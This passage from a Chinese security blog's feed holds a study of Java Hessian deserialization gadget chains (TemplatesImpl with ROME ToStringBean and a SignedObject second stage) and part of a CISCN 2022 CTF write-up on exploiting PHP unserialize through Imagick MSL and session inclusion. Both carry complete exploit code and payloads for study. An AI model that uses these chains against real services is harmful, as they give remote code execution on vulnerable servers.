class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\google download\\shell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = serialize(hashMap);</span><br><span class="line">        deserialize(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实是由于<code>TemplatesImpl</code>类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致<code>TemplatesImpl</code>类无法初始化<img src="../images/image-20230706175648609.png" alt="image-20230706175648609"></p><p><strong>但是如果在jdk的原生反序列化的话就可以序列化成功</strong></p><p>我们知道，在使用Java原生的反序列化时，如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p><p><img src="../images/image-20230706175844926.png" alt="image-20230706175844926"></p><p>可以看到这里手动new了一个TransformerFactoryImpl类赋值给<code>_tfactory</code>，这样就解决了<code>_tfactory</code>无法被序列化的情况</p><p>当一个变量被声明为 transient 时，在进行对象的序列化过程中，该变量的值不会被持久化保存到字节流中。这意味着在对象被反序列化后，<strong>该变量的值将会被设置为其默认值，而不是序列化时的值。</strong></p><p>如果一个类中包含了 <code>readObject</code> 方法，在对象进行反序列化时，会按照以下顺序执行相关操作：</p><ol><li>默认的反序列化操作会读取对象的非 transient 字段，并将它们的值恢复。</li><li>如果类中有 <code>readObject</code> 方法，那么该方法会被调用。在这个方法中，你可以自定义读取和恢复对象状态的过程。你可以使用 <code>defaultReadObject</code> 方法读取默认字段值，也可以通过实现自定义逻辑来恢复其他字段的值。</li><li>反序列化过程完成后，返回反序列化后的对象。</li></ol><p><strong>所以说就是变量被声明为 transient的时候可以进行序列化操作，只不过是会再反序列化(<code>readobject</code>)的时候值仍然是默认值</strong> </p><p><strong>那么我们应该怎么办呢  想法就是想让其进行序列化成功，如何然后再使用<code>hessian</code>进行反序列化</strong></p><p>这里的话我们就可以想到二次反序列化了  这里使用的是<code>SignedObject</code>这个类</p><p><img src="../images/image-20230706180355930.png" alt="image-20230706180355930"></p><p><strong>这里面用的就是原生的jdk序列</strong></p><p>在SignedObject类的构造函数能够序列化一个类并且将其存储到属性<code>content</code>中</p><p>在其<code>getObject()</code>中能够将其反序列化出来，并且该方法还是getter</p><p><img src="../images/image-20230706200004122.png" alt="image-20230706200004122"></p><p>rome 的<code>ToStringBean</code>的<code>toString()</code>方法  是可以调用任意<code>getter</code>方法的</p><p><strong>这就完美符合我们的利用条件，于是可以构造出如下Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_SignedObject</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2023.1.2\\project\\Hessian\\src\\main\\java\\org\\example\\calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处写法较为固定，用于初始化SignedObject类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);</span><br><span class="line">        Hessian2_Deserial(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>个人理解</strong></p><p>在序列化的时候<img src="../images/image-20230706214832344.png" alt="image-20230706214832344"></p><p>这个回执行里面的方法来奖上面的<code>templatesimpl</code>给序列化掉</p><p>然后在反序列化的时候</p><p><img src="../images/image-20230706214927202.png" alt="image-20230706214927202"></p><p>这个方法会调用任意<code>getter</code>方法  然后就会调用到<code>SignedObject</code>里面的<code>getObject</code>方法</p><p><img src="../images/image-20230706215135347.png" alt="image-20230706215135347"></p><p>然后就会执行反序列化操作  最后执行恶意代码</p><p><img src="../images/image-20230706215244806.png" alt="image-20230706215244806"></p><h3 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h3><p>这里的话了解就行  因为搭建环境比较麻烦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1193&quot;&gt;文章1&lt;/a&gt;    &lt;a href=&quot;https://su18.org/post/hessian/#xbean&quot;&gt;文章2&lt;/a&gt;  &lt;a href=&quot;https://juejin.</summary>
      
    
    
    
    
    <category term="java-Hessian" scheme="https://ke1nys.github.io/tags/java-Hessian/"/>
    
  </entry>
  
  <entry>
    <title>ciscn决赛-2022-backdoor</title>
    <link href="https://ke1nys.github.io/posts/869a12bf.html"/>
    <id>https://ke1nys.github.io/posts/869a12bf.html</id>
    <published>2023-06-21T07:58:09.000Z</published>
    <updated>2023-06-21T08:41:22.393Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">题目wp</a></p><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">题目中关键的利用知识点</a></p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/tree/master">这里面有backdoor的docker容器</a></p><p>这里写这篇文章的目的是来加深对这道题的理解</p><p><strong>题目源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;stdclass&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;__sleep failed...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">            ) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">                <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); // 没有<span class="title">echo</span></span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码，存在两个魔法函数：</p><ul><li><code>__sleep()</code>，执行serialize()时，先会调用这个函数。这里可以实现任意文件包含。</li><li><code>__wakeup()</code>，执行unserialize()时，先会调用这个函数。这里可以执行一次无参函数结构。</li></ul><p>对于<code>__sleep__</code>来说，如果我们能够包含临时文件或者session即可rce。</p><p>目前的思路就有了，我们能够通过回调函数调用<code>session_start</code>，这里会触发序列化操作，如果我们能够控制session内容，那么就可以触发<code>__sleep</code>函数进行文件包含达成rce。接下来的目标则是想办法控制session内容。</p><p>(<strong>这个<code>session_start</code>是关键，在开启这个的时候会自动进行序列化，就是将session里的值进行序列化后存入存储介质中，然后因为访问了session中的数据，会自动将session中的值进行反序列化操作</strong>)</p><p><img src="../images/image-20230621160515951.png" alt="image-20230621160515951"></p><p>(<strong>是先进行—-反序列化—-在进行—-序列化—-操作</strong>)</p><p>对于<code>__wakeup__</code>来说，我们可以执行一次php内部类，那么我们可以利用此来探测信息</p><p>构造反序列化payload查看phpinfo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621162803997.png" alt="image-20230621162803997"></p><p>发现imagick拓展，想起之前看过的文章<a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">exploiting-arbitrary-object-instantiations</a>，文章讲述了针对以下结构的php代码的一种攻击方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>再查看一下<code>__wakeup</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">           <span class="keyword">if</span> (</span><br><span class="line">               <span class="variable language_">$this</span>-&gt;do_exec_func &amp;&amp; </span><br><span class="line">               <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>, <span class="title function_ invoke__">get_defined_functions</span>()[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">           ) &#123;</span><br><span class="line">                   <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">               <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">               </span></span><br><span class="line"><span class="class">               <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>); </span></span><br><span class="line"><span class="class">           &#125;</span></span><br><span class="line"><span class="class">   &#125;</span></span><br></pre></td></tr></table></figure><p>一方面题目给了同类型代码，另一方面题目限制了通过内置类的利用，显然我们需要利用<code>imagick</code>的特性进行攻击</p><p><code>imagick</code>类在初始化时可以执行<code>Magick Scripting Language</code>。那么考虑用其特性，在临时文件中写入<code>Magick Scripting Language</code>，然后在<code>imagick</code>类<strong>初始化的时候执行临时文件并且写入<code>session</code>文件</strong>。再触发<code>__sleep</code>包含<code>session</code>文件以<code>RCE</code>。</p><p>首先利用网站提供的功能，删除<code>/tmp</code>下的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:9999/?cmd=rm</span></span><br></pre></td></tr></table></figure><p>接下来发包写入session</p><p>构造反序列化数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="string">&quot;vid:msl:/tmp/php*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&quot;imagick&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$do_exec_func</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p><strong>最后在反序列化的时候是会执行这样</strong>  <code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code></p><p>发包</p><figure class="highlight php"><table><tr><td 